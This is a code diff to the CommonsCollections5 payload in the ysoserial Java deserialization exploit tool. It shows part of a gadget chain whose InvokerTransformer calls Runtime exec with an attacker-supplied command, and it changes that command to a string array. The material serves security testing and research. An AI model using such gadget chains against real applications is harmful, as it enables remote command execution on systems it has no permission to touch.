@@ -42,13 +42,11 @@ import ysoserial.payloads.util.Reflections;
 	Requires:
 		commons-collections
  */
-@PayloadTest(skip="need more robust way to detect Runtime.exec() without SecurityManager()")
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
 public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
 	
-	public BadAttributeValueExpException getObject(final String command) throws Exception {
-		final String[] execArgs = new String[] { command };
+	public BadAttributeValueExpException getObject(final String[] command) throws Exception {
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
 		        new Transformer[]{ new ConstantTransformer(1) });
@@ -62,7 +60,7 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 					Object.class, Object[].class }, new Object[] {
 					null, new Object[0] }),
 				new InvokerTransformer("exec",
-					new Class[] { String.class }, execArgs),
+					new Class[] { String.class }, command),
 				new ConstantTransformer(1) };
 
 		final Map innerMap = new HashMap();
